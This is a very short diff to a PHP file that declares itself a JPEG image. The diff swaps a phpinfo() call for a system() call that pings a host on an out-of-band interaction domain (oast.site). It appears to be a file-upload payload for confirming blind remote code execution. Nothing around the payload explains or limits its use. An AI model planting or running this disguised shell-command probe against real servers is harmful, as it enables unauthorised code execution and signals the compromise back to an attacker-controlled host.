@@ -1,4 +1,4 @@
 <?php
 header('Content-type: image/jpeg'); 
-phpinfo();
+system('ping -c 1 cnu3cqqvac6ee2uii78grrd9dcorucuqs.oast.site');
 ?>
